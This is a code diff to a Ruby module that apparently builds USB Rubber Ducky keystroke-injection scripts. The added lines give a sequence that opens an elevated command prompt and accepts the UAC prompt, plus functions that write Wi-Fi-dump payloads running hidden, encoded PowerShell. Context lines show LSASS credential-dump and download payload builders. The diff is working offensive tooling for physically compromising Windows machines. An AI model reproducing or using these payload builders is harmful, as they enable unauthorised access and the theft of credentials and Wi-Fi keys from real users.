@@ -7,7 +7,8 @@ module DuckySetUp
     #"DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 3000\nALT y\nDELAY 500"
   end
   def admin_with_out_uac
-    "DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 500"
+    "DELAY 2000\nCTRL ESC\nDELAY 200\nSTRING cmd\nCTRL-SHIFT ENTER\nDELAY 2000\nALT y\nDELAY 500"
+    #"DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 500"
   end
   def low_priv
     "DELAY 2000\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 500"
@@ -38,6 +39,12 @@ module DuckySetUp
   end
   def ducky_lsass_no_uac(encoded_command1,encoded_command2)
     File.open("#{text_path}#{lsass_dump_file}", 'w') {|f| f.write("#{admin_with_out_uac}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command1}\nENTER\nDELAY 500\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 1000\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command2}\nENTER")}
+  end
+  def ducky_wifi_uac(encoded_command)
+    File.open("#{text_path}#{wifi_dump_file}", 'w') {|f| f.write("#{admin_with_uac}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
+  end
+  def ducky_wifi_no_uac(encoded_command)
+    File.open("#{text_path}#{wifi_dump_file}", 'w') {|f| f.write("#{admin_with_out_uac}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
   end
   def ducky_wget_uac(encoded_command)
     File.open("#{text_path}#{wget_file}", 'w') {|f| f.write("#{admin_with_uac}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
